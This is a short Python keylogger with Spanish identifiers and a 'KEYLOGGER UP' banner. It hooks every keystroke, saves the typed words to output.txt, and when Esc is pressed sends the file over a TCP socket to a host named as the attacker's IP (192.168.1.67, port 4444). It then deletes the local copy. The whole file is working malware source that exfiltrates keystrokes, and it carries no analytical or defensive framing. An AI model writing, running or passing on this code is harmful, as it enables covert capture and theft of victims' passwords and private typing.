import keyboard
import sys
import socket
import os

print("""
*****************
    INICIO
    KEYLOGGER UP
*****************
""")
palabra=""

def pulsacion(event):
    global palabra
    if event.event_type==keyboard.KEY_DOWN:
        if len(event.name)== 1 and event.name.isprintable() :
            palabra += event.name
        elif event.name == "space" or event.name=="tab" or event.name=="enter":
            guardar_palabra()

def guardar_palabra():
    global palabra
    with open("output.txt", "a") as file:
        file.write(palabra+"\n")
    print(f"Palabra registrada: {palabra}")
    palabra=""

ip_atacante="192.168.1.67"
puerto=4444
archivo="output.txt"

def detener_script():
    print("***Preparando para enviar lo capturado***")
    keyboard.unhook_all()
    enviar_archivo(archivo,ip_atacante,puerto)

def enviar_archivo(archivo_a_enviar, ip_destino, puerto_destino):
    try:
        with open(archivo_a_enviar,'rb') as file2: #Se tiene que mandar en binarios
            contenido=file2.read()
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
            s.connect((ip_destino,puerto_destino))
            s.sendall(contenido)
            os.remove("output.txt")
            sys.exit()
    except Exception as c:
        print("Tenemos el error: ",c)

keyboard.hook(pulsacion)

try:
    keyboard.wait("esc")
    detener_script()
except KeyboardInterrupt:
    print("Error en el script")
    pass
